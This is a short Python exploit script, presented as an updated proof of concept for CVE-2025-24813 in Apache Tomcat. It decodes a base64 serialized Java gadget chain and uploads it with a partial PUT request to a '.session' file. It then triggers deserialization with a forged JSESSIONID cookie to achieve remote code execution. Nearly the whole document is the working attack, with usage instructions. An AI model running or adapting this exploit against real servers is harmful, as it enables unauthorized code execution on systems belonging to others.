# I created an updated version of PaloAlto's PoC for CVE-2025-24813.
# The payloads were generated using Java Chains https://github.com/vulhub/java-chains
# reference: https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md
# Example Usage: python3 CVE-2025-24813-poc.py -u http://127.0.0.1:8080 -p "Base64_encoded_payload"
import requests
import base64
import os
import argparse

def check_target(url: str) -> bool:
	if not url.startswith("http") and not url.endswith("/"):
		return False
	return True

def exploit_tomcat(url: str, payload: str):
    bin_file = "decoded_chain.bin"

    try:
        decoded_content = base64.b64decode(payload)

        with open(bin_file, "wb") as f:
            f.write(decoded_content)
    except Exception as e:
        print(f"Failed to decode {e}")

    put_url = f"{url}/gopan.session"
    put_headers = {"Content-Range": "bytes 0-5/100"}

    with open(bin_file, "rb") as f:
        res = requests.put(put_url, data=f, headers=put_headers)
    os.remove(bin_file)

    get_url = f"{url}/"
    get_headers = {"Cookie": "JSESSIONID=.gopan"}
    res = requests.get(get_url, headers=get_headers)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Here is my updated CVE-2025-24813 exploit PoC originally created by PaloAlto")
    parser.add_argument("-u","--url", help="Target URL", required=True)
    parser.add_argument("-p","--payload", help="b64 encoded serialized java-object", required=True)
    args = parser.parse_args()

    if not args.url and not check_target(args.url):
        print(f"Url {args.url} is not formatted properly.")
        quit()

    if not args.payload:
        print("Missing serialized payload")

    exploit_tomcat(args.url, args.payload)
